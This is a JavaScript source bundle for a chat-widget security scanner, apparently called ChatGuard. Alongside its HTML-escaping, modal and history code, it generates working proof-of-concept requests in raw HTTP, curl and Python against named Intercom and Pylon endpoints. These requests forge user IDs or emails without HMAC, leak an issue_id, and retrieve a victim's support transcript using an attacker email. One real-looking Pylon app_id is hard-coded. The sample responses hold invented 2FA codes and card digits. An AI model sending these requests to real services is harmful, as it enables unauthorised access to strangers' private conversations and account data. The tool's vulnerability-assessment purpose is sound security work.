'use strict';

// ──────────────────────────────────────────────────
// utils.js
// ──────────────────────────────────────────────────
// ══════════════════════════════════════════════════
// utils.js — Shared utilities
// ══════════════════════════════════════════════════

/**
 * escapeHtml — sanitize ALL user-controlled strings before
 * inserting into innerHTML. Prevents XSS from:
 *   - Scanned URLs     (could contain <script> in the path)
 *   - app_id / vendor  (extracted from remote JS files)
 *   - Scan log messages (include filenames from CDN responses)
 *   - History table rows
 */
function escapeHtml(str) {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

/**
 * safeUrl — validates that a string is a safe http/https URL.
 * Returns the cleaned URL or null if it fails validation.
 * Prevents javascript: and data: URL injection.
 */
function safeUrl(input) {
  try {
    const u = new URL(input.trim());
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
    return u.href;
  } catch {
    return null;
  }
}

/**
 * safeText — like escapeHtml but also strips non-printable control chars.
 * Use for content going into title attributes or log lines.
 */
function safeText(str) {
  return escapeHtml(str).replace(/[\x00-\x1F\x7F]/g, '');
}

/**
 * setText / setHtml — safe wrappers around DOM mutation.
 * setText always uses textContent (never innerHTML).
 * setHtml should only be called with already-sanitized markup.
 */
function setText(el, value) {
  if (el) el.textContent = value ?? '';
}

function setHtml(el, markup) {
  if (el) el.innerHTML = markup ?? '';
}


// ──────────────────────────────────────────────────
// modal.js
// ──────────────────────────────────────────────────
// cgAlert / cgConfirm — custom modal system
// Replaces all browser alert() and confirm() calls.
// ══════════════════════════════════════════════════
function _cgShowModal(title, msg, buttons) {
  const bd  = document.getElementById('cgModalBackdrop');
  const ttl = document.getElementById('cgModalTitle');
  const txt = document.getElementById('cgModalMsg');
  const act = document.getElementById('cgModalActions');
  if (!bd) return;
  ttl.textContent = title;
  txt.textContent = msg;
  act.innerHTML = '';
  buttons.forEach(({ label, cls, cb }) => {
    const b = document.createElement('button');
    b.className = `btn btn-sm ${cls || ''}`;
    b.textContent = label;
    b.onclick = () => { bd.classList.remove('open'); cb(); };
    act.appendChild(b);
  });
  bd.classList.add('open');
  // Escape key closes
  const esc = e => { if (e.key === 'Escape') { bd.classList.remove('open'); window.removeEventListener('keydown', esc); } };
  window.addEventListener('keydown', esc);
}

function cgAlert(msg, title = 'Notice') {
  return new Promise(resolve => {
    _cgShowModal(title, msg, [{ label: 'OK', cls: '', cb: resolve }]);
  });
}

function cgConfirm(msg, title = 'Confirm') {
  return new Promise(resolve => {
    _cgShowModal(title, msg, [
      { label: 'Cancel', cls: 'btn-danger',  cb: () => resolve(false) },
      { label: 'Confirm', cls: '',           cb: () => resolve(true)  },
    ]);
  });
}

// ──────────────────────────────────────────────────
// storage.js
// ──────────────────────────────────────────────────
// ══════════════════════════════════════════════════
// storage.js — Scan history + settings persistence
// ══════════════════════════════════════════════════

const Storage = (() => {
  const HISTORY_KEY  = 'cg_history';
  const SETTINGS_KEY = 'cg_settings';

  const DEFAULTS = {
    a01: true, a02: true, a03: true, uuidNote: true,
    reqFmt: 'raw',
    email: 'victim@example.com',
    userIdType: 'sequential',
  };

  function getSettings() {
    try {
      return Object.assign({}, DEFAULTS, JSON.parse(localStorage.getItem(SETTINGS_KEY) || '{}'));
    } catch {
      return { ...DEFAULTS };
    }
  }

  function saveSetting(key, value) {
    const s = getSettings();
    s[key] = value;
    localStorage.setItem(SETTINGS_KEY, JSON.stringify(s));
  }

  function getHistory() {
    try {
      return JSON.parse(localStorage.getItem(HISTORY_KEY) || '[]');
    } catch {
      return [];
    }
  }

  function addScan(scan) {
    const history = getHistory();
    history.unshift({ ...scan, id: Date.now(), ts: new Date().toISOString() });
    localStorage.setItem(HISTORY_KEY, JSON.stringify(history.slice(0, 200)));
    renderHistory();
  }

  async function clearAll() {
    if (!await cgConfirm('Clear all scan history? This cannot be undone.', 'Clear History')) return;
    localStorage.removeItem(HISTORY_KEY);
    renderHistory();
    Analytics.render();
  }

  function exportJSON() {
    const blob = new Blob([JSON.stringify(getHistory(), null, 2)], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'chatguard_history.json';
    a.click();
    URL.revokeObjectURL(a.href);
  }

  function renderHistory() {
    const query = (document.getElementById('histSearch')?.value || '').toLowerCase();
    const rows  = getHistory().filter(s => !query || s.url.toLowerCase().includes(query));
    const tbody = document.getElementById('historyBody');
    if (!tbody) return;

    if (!rows.length) {
      setHtml(tbody, `<tr><td colspan="7" class="empty-state">No scans recorded yet.</td></tr>`);
      return;
    }

    setHtml(tbody, rows.map(s => {
      // All user-controlled data escaped before entering innerHTML
      const urlSafe    = escapeHtml(s.url);
      const vendorSafe = escapeHtml(s.vendor || 'Unknown');
      const appIdSafe  = escapeHtml(s.appId || '—');

      const pill = s.vulnerable
        ? `<span class="status-pill pill-vuln">&#9679; Vulnerable</span>`
        : `<span class="status-pill pill-safe">&#9679; Secure</span>`;

      const cvss = s.cvss
        ? `<span class="cvss-badge cvss-high">${escapeHtml(String(s.cvss))} HIGH</span>`
        : `<span class="cvss-badge cvss-safe">N/A</span>`;

      const sl = (s.securityStatus === 'SECURE' || s.hasHmac)
        ? { text: 'SECURE: HMAC', css: 'badge-secure', icon: '🔒' }
        : s.securityStatus === 'NO_WIDGET'
          ? { text: 'OUT OF SCOPE', css: 'badge-neutral', icon: '🔍' }
          : { text: 'VULNERABLE: NO-HMAC', css: 'badge-vuln', icon: '⚠' };

      const secBadge = `<span class="sec-badge ${sl.css}">${sl.icon} ${escapeHtml(sl.text)}</span>`;

      return `<tr>
        <td style="font-family:var(--font-mono);font-size:.75rem;color:var(--text-muted)">${escapeHtml(new Date(s.ts).toLocaleString())}</td>
        <td style="font-family:var(--font-mono);font-size:.75rem;max-width:14rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
            title="${urlSafe}">${urlSafe}</td>
        <td><span style="color:var(--accent)">${vendorSafe}</span></td>
        <td>${cvss}</td>
        <td>${secBadge}</td>
        <td>${pill}</td>
        <td><button class="btn btn-sm js-inspect-scan" data-scan-id="${Number(s.id)}">Inspect</button></td>
      </tr>`;
    }).join(''));
  }

  function applySettings() {
    const s = getSettings();
    ['a01','a02','a03','uuidNote'].forEach(k => {
      const el = document.getElementById('setting' + k.charAt(0).toUpperCase() + k.slice(1));
      if (el) el.checked = s[k];
    });
    const reqFmtEl  = document.getElementById('settingReqFmt');
    const emailEl   = document.getElementById('settingEmail');
    const uidTypeEl = document.getElementById('settingUserIdType');
    if (reqFmtEl)  reqFmtEl.value  = s.reqFmt;
    if (emailEl)   emailEl.value   = s.email;
    if (uidTypeEl) uidTypeEl.value = s.userIdType;
  }

  return { getSettings, saveSetting, getHistory, addScan, clearAll, exportJSON, renderHistory, applySettings };
})();


// ──────────────────────────────────────────────────
// templates.js
// ──────────────────────────────────────────────────
// ══════════════════════════════════════════════════
// TemplateManager.js — PoC HTTP templates from PDF
// ══════════════════════════════════════════════════
const TemplateManager = (() => {
  // Read live input value first, fall back to settings
  function getUserId(liveVal) {
    if (liveVal) return liveVal;
    const s = Storage.getSettings();
    return s.userIdType === 'uuid' ? 'a3f5b291-7c3d-4e88-b012-9f1234567890' : '85070';
  }
  function getEmail(liveVal) {
    return liveVal || Storage.getSettings().email || 'victim@example.com';
  }
  function getBlocks(liveVal) {
    return liveVal || '[{"type":"paragraph","text":"ChatGuard_Test"}]';
  }

  const PYLON_APP_ID = '99eb6b49-90f0-42c5-99f5-6f509ecc0e88';

  const templates = {
    a01: {
      // (appId, userId, email, issueId, blocks) — all live params passed through
      raw: (appId, userId, email, issueId, blocks) => `<span class="http-method">POST</span> <span class="http-path">/messenger/web/conversations</span> <span class="http-version">HTTP/2</span>
<span class="http-header-key">Host:</span> <span class="http-header-val">api-iam.intercom.io</span>
<span class="http-header-key">User-Agent:</span> <span class="http-header-val">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0</span>
<span class="http-header-key">Accept:</span> <span class="http-header-val">*/*</span>
<span class="http-header-key">Accept-Language:</span> <span class="http-header-val">en-US,en;q=0.5</span>
<span class="http-header-key">Accept-Encoding:</span> <span class="http-header-val">gzip, deflate, br</span>
<span class="http-header-key">Content-Type:</span> <span class="http-header-val">application/x-www-form-urlencoded</span>
<span class="http-header-key">Origin:</span> <span class="http-header-val">https://app.target.com</span>
<span class="http-header-key">Referer:</span> <span class="http-header-val">https://app.target.com</span>
<span class="http-header-key">Sec-Fetch-Dest:</span> <span class="http-header-val">empty</span>
<span class="http-header-key">Sec-Fetch-Mode:</span> <span class="http-header-val">cors</span>
<span class="http-header-key">Sec-Fetch-Site:</span> <span class="http-header-val">cross-site</span>

<span class="http-body-key">app_id</span>=<span class="http-body-val">${appId || 'example_app_id'}</span>&<span class="http-body-key">user_data</span>={"<span class="http-body-key">user_id</span>":"<span class="http-vuln-val">${getUserId(userId)}</span>"}&<span class="http-body-key">blocks</span>=${getBlocks(blocks)}`,
      curl: (appId, userId, email, issueId, blocks) => `<span class="curl-cmd">curl</span> <span class="curl-flag">-X POST</span> <span class="curl-url">https://api-iam.intercom.io/messenger/web/conversations</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">-H</span> <span class="curl-val">"Accept: */*"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">-H</span> <span class="curl-val">"Content-Type: application/x-www-form-urlencoded"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">-H</span> <span class="curl-val">"Origin: https://app.target.com"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">'app_id=${appId || 'example_app_id'}'</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">'user_data={"user_id":"${getUserId(userId)}"}'</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">'blocks=${getBlocks(blocks)}'</span>

<span class="curl-comment"># NOTE: No user_hash parameter — Identity Verification not enforced</span>`,
      python: (appId, userId, email, issueId, blocks) => `<span class="py-kw">import</span> <span class="py-var">requests</span>

<span class="py-var">url</span> = <span class="py-str">"https://api-iam.intercom.io/messenger/web/conversations"</span>
<span class="py-var">headers</span> = {
    <span class="py-str">"Accept"</span>: <span class="py-str">"*/*"</span>,
    <span class="py-str">"Content-Type"</span>: <span class="py-str">"application/x-www-form-urlencoded"</span>,
    <span class="py-str">"Origin"</span>: <span class="py-str">"https://app.target.com"</span>,
}
<span class="py-comment"># VULN: No user_hash — server trusts user_id without HMAC verification</span>
<span class="py-var">data</span> = {
    <span class="py-str">"app_id"</span>: <span class="py-str">"${appId || 'example_app_id'}"</span>,
    <span class="py-str">"user_data"</span>: <span class="py-str">'{"user_id": "${getUserId(userId)}"}'</span>,
    <span class="py-str">"blocks"</span>: <span class="py-str">'${getBlocks(blocks)}'</span>,
}
<span class="py-var">resp</span> = <span class="py-var">requests</span>.<span class="py-fn">post</span>(<span class="py-var">url</span>, headers=<span class="py-var">headers</span>, data=<span class="py-var">data</span>)
<span class="py-builtin">print</span>(<span class="py-var">resp</span>.<span class="py-fn">json</span>())`
    },
    a02: {
      raw: (appId, userId, email, issueId, blocks) => `<span class="http-method">POST</span> <span class="http-path">/messenger/web/conversations</span> <span class="http-version">HTTP/2</span>
<span class="http-header-key">Host:</span> <span class="http-header-val">api-iam.intercom.io</span>
<span class="http-header-key">User-Agent:</span> <span class="http-header-val">Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0</span>
<span class="http-header-key">Accept:</span> <span class="http-header-val">*/*</span>
<span class="http-header-key">Accept-Language:</span> <span class="http-header-val">en-US,en;q=0.5</span>
<span class="http-header-key">Accept-Encoding:</span> <span class="http-header-val">gzip, deflate, br</span>
<span class="http-header-key">Content-Type:</span> <span class="http-header-val">application/x-www-form-urlencoded</span>
<span class="http-header-key">Origin:</span> <span class="http-header-val">[REDACTED]</span>
<span class="http-header-key">Referer:</span> <span class="http-header-val">[REDACTED]</span>
<span class="http-header-key">Sec-Fetch-Dest:</span> <span class="http-header-val">empty</span>
<span class="http-header-key">Sec-Fetch-Mode:</span> <span class="http-header-val">cors</span>
<span class="http-header-key">Sec-Fetch-Site:</span> <span class="http-header-val">cross-site</span>

<span class="http-body-key">app_id</span>=<span class="http-body-val">${appId || 'example_app_id'}</span>&<span class="http-body-key">user_data</span>={"<span class="http-body-key">email</span>":"<span class="http-vuln-val">${getEmail(email)}</span>"}&<span class="http-body-key">blocks</span>=${getBlocks(blocks)}`,
      curl: (appId, userId, email, issueId, blocks) => `<span class="curl-cmd">curl</span> <span class="curl-flag">-X POST</span> <span class="curl-url">https://api-iam.intercom.io/messenger/web/conversations</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">-H</span> <span class="curl-val">"Content-Type: application/x-www-form-urlencoded"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">-H</span> <span class="curl-val">"Origin: https://app.target.com"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">'app_id=${appId || 'example_app_id'}'</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">'user_data={"email":"${getEmail(email)}"}'</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">'blocks=${getBlocks(blocks)}'</span>

<span class="curl-comment"># VULN: user_hash absent — backend accepts any email without HMAC-SHA256 verification</span>`,
      python: (appId, userId, email, issueId, blocks) => `<span class="py-kw">import</span> <span class="py-var">requests</span>

<span class="py-var">url</span> = <span class="py-str">"https://api-iam.intercom.io/messenger/web/conversations"</span>
<span class="py-var">headers</span> = {
    <span class="py-str">"Content-Type"</span>: <span class="py-str">"application/x-www-form-urlencoded"</span>,
    <span class="py-str">"Origin"</span>: <span class="py-str">"https://app.target.com"</span>,
}
<span class="py-comment"># VULN: No user_hash — server trusts supplied email without cryptographic proof</span>
<span class="py-var">data</span> = {
    <span class="py-str">"app_id"</span>: <span class="py-str">"${appId || 'example_app_id'}"</span>,
    <span class="py-str">"user_data"</span>: <span class="py-str">'{"email": "${getEmail(email)}"}'</span>,
    <span class="py-str">"blocks"</span>: <span class="py-str">'${getBlocks(blocks)}'</span>,
    <span class="py-comment"># "user_hash": "MISSING — should be HMAC-SHA256(secret, email)"</span>
}
<span class="py-var">resp</span> = <span class="py-var">requests</span>.<span class="py-fn">post</span>(<span class="py-var">url</span>, headers=<span class="py-var">headers</span>, data=<span class="py-var">data</span>)
<span class="py-var">conversations</span> = <span class="py-var">resp</span>.<span class="py-fn">json</span>().<span class="py-fn">get</span>(<span class="py-str">"conversations"</span>, [])
<span class="py-kw">for</span> <span class="py-var">c</span> <span class="py-kw">in</span> <span class="py-var">conversations</span>:
    <span class="py-builtin">print</span>(<span class="py-var">c</span>[<span class="py-str">"id"</span>], <span class="py-var">c</span>.<span class="py-fn">get</span>(<span class="py-str">"conversation_message"</span>, {}).<span class="py-fn">get</span>(<span class="py-str">"blocks"</span>))`
    },
    a03_step1: {
      raw: (appId, userId, email) => `<span class="http-method">GET</span> <span class="http-path">/chatwidget/unreads?app_id=${PYLON_APP_ID}&email=${getEmail(email)}</span> <span class="http-version">HTTP/2</span>
<span class="http-header-key">Host:</span> <span class="http-header-val">apichatwidget.usepylon.com</span>
<span class="http-header-key">User-Agent:</span> <span class="http-header-val">Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0</span>
<span class="http-header-key">Accept:</span> <span class="http-header-val">*/*</span>
<span class="http-header-key">Accept-Language:</span> <span class="http-header-val">en-US,en;q=0.5</span>
<span class="http-header-key">Accept-Encoding:</span> <span class="http-header-val">gzip, deflate, br</span>
<span class="http-header-key">Sec-Fetch-Dest:</span> <span class="http-header-val">empty</span>
<span class="http-header-key">Sec-Fetch-Mode:</span> <span class="http-header-val">cors</span>
<span class="http-header-key">Sec-Fetch-Site:</span> <span class="http-header-val">cross-site</span>
<span class="http-header-key">Cache-Control:</span> <span class="http-header-val">max-age=0</span>

<span style="color:var(--text-muted)"># Step 1: Leaks issue_id from any email — information disclosure</span>`,
      curl: (appId, userId, email) => `<span class="curl-cmd">curl</span> <span class="curl-flag">-G</span> <span class="curl-url">https://apichatwidget.usepylon.com/chatwidget/unreads</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">-H</span> <span class="curl-val">"Accept: */*"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">"app_id=${PYLON_APP_ID}"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">"email=${getEmail(email)}"</span>

<span class="curl-comment"># VULN Step 1: Endpoint returns internal issue_id for any supplied email</span>
<span class="curl-comment"># No authentication required — pure information disclosure</span>`,
      python: (appId, userId, email) => `<span class="py-kw">import</span> <span class="py-var">requests</span>

<span class="py-var">url</span> = <span class="py-str">"https://apichatwidget.usepylon.com/chatwidget/unreads"</span>
<span class="py-var">params</span> = {
    <span class="py-str">"app_id"</span>: <span class="py-str">"${PYLON_APP_ID}"</span>,
    <span class="py-str">"email"</span>: <span class="py-str">"${getEmail(email)}"</span>,     <span class="py-comment"># Target victim email</span>
}
<span class="py-var">resp</span> = <span class="py-var">requests</span>.<span class="py-fn">get</span>(<span class="py-var">url</span>, params=<span class="py-var">params</span>)
<span class="py-var">data</span> = <span class="py-var">resp</span>.<span class="py-fn">json</span>()
<span class="py-comment"># Extract internal issue_id — used in Step 2</span>
<span class="py-var">issue_id</span> = <span class="py-var">data</span>[<span class="py-str">"data"</span>][<span class="py-str">"issues"</span>][<span class="py-num">0</span>][<span class="py-str">"issue_id"</span>]
<span class="py-builtin">print</span>(<span class="py-fn">f</span><span class="py-str">"Leaked issue_id: {issue_id}"</span>)`
    },
    a03_step2: {
      raw: (appId, userId, email, issueId) => `<span class="http-method">GET</span> <span class="http-path">/chatwidget/issue?app_id=${PYLON_APP_ID}&email=hacker@evil.com&issue_id=<span class="http-vuln-val">${issueId || '4a53f4bb-b4c9-40f4-8b2a-000000019921'}</span></span> <span class="http-version">HTTP/2</span>
<span class="http-header-key">Host:</span> <span class="http-header-val">apichatwidget.usepylon.com</span>
<span class="http-header-key">User-Agent:</span> <span class="http-header-val">Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0</span>
<span class="http-header-key">Accept:</span> <span class="http-header-val">*/*</span>
<span class="http-header-key">Accept-Language:</span> <span class="http-header-val">en-US,en;q=0.5</span>
<span class="http-header-key">Accept-Encoding:</span> <span class="http-header-val">gzip, deflate, br</span>
<span class="http-header-key">Sec-Fetch-Dest:</span> <span class="http-header-val">empty</span>
<span class="http-header-key">Sec-Fetch-Mode:</span> <span class="http-header-val">cors</span>
<span class="http-header-key">Cache-Control:</span> <span class="http-header-val">max-age=0</span>

<span style="color:var(--text-muted)"># Step 2: Mismatch email accepted — server checks issue_id existence only (OR logic not AND)</span>`,
      curl: (appId, userId, email, issueId) => `<span class="curl-comment"># Step 2: Use leaked issue_id with ANY attacker-controlled email</span>
<span class="curl-cmd">curl</span> <span class="curl-flag">-G</span> <span class="curl-url">https://apichatwidget.usepylon.com/chatwidget/issue</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">-H</span> <span class="curl-val">"Accept: */*"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">"app_id=${PYLON_APP_ID}"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">"email=hacker@evil.com"</span> <span class="curl-flag">\\</span>
  <span class="curl-flag">--data-urlencode</span> <span class="curl-val">"issue_id=${issueId || '4a53f4bb-b4c9-40f4-8b2a-000000019921'}"</span>

<span class="curl-comment"># VULN: Server validates issue_id OR email — not both together</span>
<span class="curl-comment"># Attacker email + victim's issue_id → full transcript returned</span>`,
      python: (appId, userId, email, issueId) => `<span class="py-kw">import</span> <span class="py-var">requests</span>

<span class="py-comment"># issue_id obtained from Step 1</span>
<span class="py-var">issue_id</span> = <span class="py-str">"${issueId || '4a53f4bb-b4c9-40f4-8b2a-000000019921'}"</span>

<span class="py-var">url</span> = <span class="py-str">"https://apichatwidget.usepylon.com/chatwidget/issue"</span>
<span class="py-var">params</span> = {
    <span class="py-str">"app_id"</span>: <span class="py-str">"${PYLON_APP_ID}"</span>,
    <span class="py-str">"email"</span>: <span class="py-str">"hacker@evil.com"</span>,   <span class="py-comment"># Attacker's own email — mismatch accepted</span>
    <span class="py-str">"issue_id"</span>: <span class="py-var">issue_id</span>,          <span class="py-comment"># Victim's issue_id from Step 1</span>
}
<span class="py-var">resp</span> = <span class="py-var">requests</span>.<span class="py-fn">get</span>(<span class="py-var">url</span>, params=<span class="py-var">params</span>)
<span class="py-var">transcript</span> = <span class="py-var">resp</span>.<span class="py-fn">json</span>()
<span class="py-comment"># Full conversation transcript of victim returned</span>
<span class="py-kw">for</span> <span class="py-var">msg</span> <span class="py-kw">in</span> <span class="py-var">transcript</span>.<span class="py-fn">get</span>(<span class="py-str">"messages"</span>, []):
    <span class="py-builtin">print</span>(<span class="py-var">msg</span>[<span class="py-str">"author"</span>][<span class="py-str">"name"</span>], <span class="py-str">":"</span>, <span class="py-var">msg</span>[<span class="py-str">"body"</span>])`
    }
  };

  const responses = {
    a01: `{
  <span class="json-key">"type"</span>: <span class="json-string">"conversation_part.list"</span>,
  <span class="json-key">"conversation_parts"</span>: [
    {
      <span class="json-key">"id"</span>: <span class="json-string">"3189660802"</span>,
      <span class="json-key">"part_type"</span>: <span class="json-string">"comment"</span>,
      <span class="json-key">"body"</span>: <span class="json-string">"Hi! I need help resetting my 2FA — I locked myself out."</span>,
      <span class="json-key">"created_at"</span>: <span class="json-num">1759749194</span>,
      <span class="json-key">"updated_at"</span>: <span class="json-num">1759749194</span>,
      <span class="json-key">"notified_at"</span>: <span class="json-num">1759749194</span>,
      <span class="json-key">"author"</span>: {
        <span class="json-key">"type"</span>: <span class="json-string">"user"</span>,
        <span class="json-key">"id"</span>: <span class="json-uuid">"60f5dc3d9fffaeddcfab498"</span>,
        <span class="json-key">"name"</span>: <span class="json-string">"Hack You"</span>,
        <span class="json-key">"email"</span>: <span class="json-string">"${Storage.getSettings().email}"</span>
      },
      <span class="json-key">"is_admin"</span>: <span class="json-bool">false</span>,
      <span class="json-key">"is_self"</span>: <span class="json-bool">true</span>
    },
    {
      <span class="json-key">"id"</span>: <span class="json-string">"3189660900"</span>,
      <span class="json-key">"part_type"</span>: <span class="json-string">"comment"</span>,
      <span class="json-key">"body"</span>: <span class="json-string">"Sure! Your backup code is <b>839-2847-AA</b>. Use this to regain access."</span>,
      <span class="json-key">"created_at"</span>: <span class="json-num">1759749350</span>,
      <span class="json-key">"author"</span>: {
        <span class="json-key">"type"</span>: <span class="json-string">"admin"</span>,
        <span class="json-key">"name"</span>: <span class="json-string">"Sarah (Support)"</span>,
        <span class="json-key">"email"</span>: <span class="json-string">"sarah@targetcompany.com"</span>
      },
      <span class="json-key">"is_admin"</span>: <span class="json-bool">true</span>
    }
  ],
  <span class="json-key">"seen_by_admin"</span>: <span class="json-string">"unseen"</span>
}`,
    a02: `{
  <span class="json-key">"pages"</span>: {
    <span class="json-key">"type"</span>: <span class="json-string">"pages"</span>,
    <span class="json-key">"next"</span>: <span class="json-bool">null</span>,
    <span class="json-key">"page"</span>: <span class="json-num">1</span>,
    <span class="json-key">"per_page"</span>: <span class="json-num">20</span>,
    <span class="json-key">"total_pages"</span>: <span class="json-num">1</span>
  },
  <span class="json-key">"conversations"</span>: [
    {
      <span class="json-key">"id"</span>: <span class="json-string">"215471165080197"</span>,
      <span class="json-key">"read"</span>: <span class="json-bool">true</span>,
      <span class="json-key">"read_at"</span>: <span class="json-num">1759749219</span>,
      <span class="json-key">"dismissed"</span>: <span class="json-bool">false</span>,
      <span class="json-key">"updated_at"</span>: <span class="json-num">1759749218</span>,
      <span class="json-key">"conversation_message"</span>: {
        <span class="json-key">"id"</span>: <span class="json-string">"message-3189660802"</span>,
        <span class="json-key">"sent_at"</span>: <span class="json-num">1759749194</span>,
        <span class="json-key">"show_created_at"</span>: <span class="json-bool">true</span>,
        <span class="json-key">"message_style"</span>: <span class="json-num">0</span>,
        <span class="json-key">"delivery_option"</span>: <span class="json-string">"summary"</span>,
        <span class="json-key">"blocks"</span>: [
          { <span class="json-key">"type"</span>: <span class="json-string">"paragraph"</span>, <span class="json-key">"text"</span>: <span class="json-string">"My credit card ending 4821 was charged without authorization."</span> }
        ]
      }
    }
  ]
}`,
    a03_step1: `{
  <span class="json-key">"data"</span>: {
    <span class="json-key">"issues"</span>: [
      {
        <span class="json-key">"issue_id"</span>: <span class="json-uuid">"4a53f4bb-b4c9-40f4-8b2a-000000019921"</span>,
        <span class="json-key">"ticket_number"</span>: <span class="json-num">1124</span>,
        <span class="json-key">"num_unread_messages"</span>: <span class="json-num">0</span>
      }
    ],
    <span class="json-key">"vendor_message"</span>: <span class="json-bool">null</span>
  }
}`,
    a03_step2: `{
  <span class="json-key">"ticket_number"</span>: <span class="json-num">1124</span>,
  <span class="json-key">"issue_id"</span>: <span class="json-uuid">"4a53f4bb-b4c9-40f4-8b2a-000000019921"</span>,
  <span class="json-key">"app_id"</span>: <span class="json-uuid">"99eb6b49-90f0-42c5-99f5-6f509ecc0e88"</span>,
  <span class="json-key">"title"</span>: <span class="json-string">"Billing issue — unauthorized charge"</span>,
  <span class="json-key">"author"</span>: { <span class="json-key">"name"</span>: <span class="json-string">"Orange"</span>, <span class="json-key">"avatar_url"</span>: <span class="json-string">"https://cdn.pylon.com/avatars/a.png"</span> },
  <span class="json-key">"chat_bubble_icon_url"</span>: <span class="json-string">"https://cdn.pylon.com/icons/bubble.png"</span>,
  <span class="json-key">"messages"</span>: [
    {
      <span class="json-key">"id"</span>: <span class="json-uuid">"msg-7f0a60fd-d6ac-47c9-9aec-6f983f8"</span>,
      <span class="json-key">"body"</span>: <span class="json-string">"I was charged $299 but I only ordered the basic plan."</span>,
      <span class="json-key">"author"</span>: { <span class="json-key">"name"</span>: <span class="json-string">"Sieve"</span>, <span class="json-key">"type"</span>: <span class="json-string">"user"</span> },
      <span class="json-key">"time"</span>: <span class="json-num">1752499459.804730</span>
    },
    {
      <span class="json-key">"id"</span>: <span class="json-uuid">"msg-9034562325720050"</span>,
      <span class="json-key">"body"</span>: <span class="json-string">"I can see your card ending 8821. I will issue a refund within 3 days."</span>,
      <span class="json-key">"author"</span>: { <span class="json-key">"name"</span>: <span class="json-string">"Sieve Support"</span>, <span class="json-key">"type"</span>: <span class="json-string">"agent"</span> },
      <span class="json-key">"time"</span>: <span class="json-num">1752499620.000000</span>
    }
  ],
  <span class="json-key">"pusher_message_id"</span>: <span class="json-num">17</span>
}`
  };

  // Raw (un-highlighted) response objects — parallel to `responses` above.
  // The `responses` map holds pre-highlighted HTML strings for the Pretty/Raw
  // views; the Chat View needs the underlying structured data to parse the
  // conversation thread, so it is kept here as plain JS objects.
  const responseData = {
    a01: {
      type: 'conversation_part.list',
      conversation_parts: [
        {
          id: '3189660802', part_type: 'comment',
          body: 'Hi! I need help resetting my 2FA — I locked myself out.',
          created_at: 1759749194, updated_at: 1759749194, notified_at: 1759749194,
          author: { type: 'user', id: '60f5dc3d9fffaeddcfab498', name: 'Hack You', email: 'victim@example.com' },
          is_admin: false, is_self: true
        },
        {
          id: '3189660900', part_type: 'comment',
          body: 'Sure! Your backup code is <b>839-2847-AA</b>. Use this to regain access.',
          created_at: 1759749350,
          author: { type: 'admin', name: 'Sarah (Support)', email: 'sarah@targetcompany.com' },
          is_admin: true
        }
      ],
      seen_by_admin: 'unseen'
    },
    a02: {
      pages: { type: 'pages', next: null, page: 1, per_page: 20, total_pages: 1 },
      conversations: [
        {
          id: '215471165080197', read: true, read_at: 1759749219, dismissed: false, updated_at: 1759749218,
          conversation_message: {
            id: 'message-3189660802', sent_at: 1759749194, show_created_at: true,
            message_style: 0, delivery_option: 'summary',
            blocks: [{ type: 'paragraph', text: 'My credit card ending 4821 was charged without authorization.' }]
          }
        }
      ]
    },
    a03_step1: {
      data: {
        issues: [{ issue_id: '4a53f4bb-b4c9-40f4-8b2a-000000019921', ticket_number: 1124, num_unread_messages: 0 }],
        vendor_message: null
      }
    },
    a03_step2: {
      ticket_number: 1124,
      issue_id: '4a53f4bb-b4c9-40f4-8b2a-000000019921',
      app_id: '99eb6b49-90f0-42c5-99f5-6f509ecc0e88',
      title: 'Billing issue — unauthorized charge',
      author: { name: 'Orange', avatar_url: 'https://cdn.pylon.com/avatars/a.png' },
      chat_bubble_icon_url: 'https://cdn.pylon.com/icons/bubble.png',
      messages: [
        {
          id: 'msg-7f0a60fd-d6ac-47c9-9aec-6f983f8',
          body: 'I was charged $299 but I only ordered the basic plan.',
          author: { name: 'Sieve', type: 'user' }, time: 1752499459.804730
        },
        {
          id: 'msg-9034562325720050',
          body: 'I can see your card ending 8821. I will issue a refund within 3 days.',
          author: { name: 'Sieve Support', type: 'agent' }, time: 1752499620.000000
        }
      ],
      pusher_message_id: 17
    }
  };

  const summaries = {
    a01: {
      id: 'A01', title: 'Intercom Misconfig — user_id IDOR',
      cvss: '7.5', severity: 'HIGH',
      vuln: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      endpoint: 'POST /messenger/web/conversations',
      api: 'api-iam.intercom.io',
      param: 'user_data → user_id',
      exposed: 'Full chat transcripts, agent names, timestamps, attachments',
